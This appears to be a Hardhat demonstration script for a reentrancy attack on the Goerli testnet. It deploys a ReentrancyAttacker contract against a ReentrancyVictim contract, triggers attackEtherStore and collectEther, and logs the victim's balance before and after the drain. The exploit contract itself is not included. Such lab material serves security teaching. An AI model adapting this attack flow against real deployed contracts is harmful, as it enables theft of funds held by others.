import { ethers } from "hardhat";
import dotenv from "dotenv";
dotenv.config();

async function main() {

  const provider = ethers.getDefaultProvider("goerli");
  const accounts = await ethers.getSigners();

  const ReentrancyVictim = await ethers.getContractFactory("ReentrancyVictim");
  const reentrancyVictim = ReentrancyVictim.attach(process.env.VICTIM_ADDRESS as string);


  var balance = await provider.getBalance(reentrancyVictim.address);
  console.log("[DEBUG] VICTIM CONTRACT BALANCE BEFORE *ATTACK*: ", balance);

  const ReentrancyAttacker = await ethers.getContractFactory("ReentrancyAttacker");
  const reentrancyAttacker = await ReentrancyAttacker.connect(accounts[2]).deploy(reentrancyVictim.address);
  await reentrancyAttacker.deployed();
  console.log(`Deployed Attacker to ${reentrancyAttacker.address}`);

  var contractResponse = await reentrancyAttacker.connect(accounts[2]).attackEtherStore({value: "10000000000000000", gasPrice: "3000000000", gasLimit: "30000000" });
  var response = await contractResponse.wait();
  console.log("[DEBUG]", accounts[2].address, "attacked... Response: ", response);

  contractResponse = await reentrancyAttacker.connect(accounts[2]).collectEther();
  response = await contractResponse.wait();
  console.log("[DEBUG]", accounts[2].address, "withdrawed... Response: ", response);
  
  console.log("[DEBUG] Attackers EOA balance:", await accounts[2].getBalance());

  balance = await provider.getBalance(reentrancyVictim.address);
  console.log("[DEBUG] VICTIM CONTRACT BALANCE AFTER ATTACK: ", balance);

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
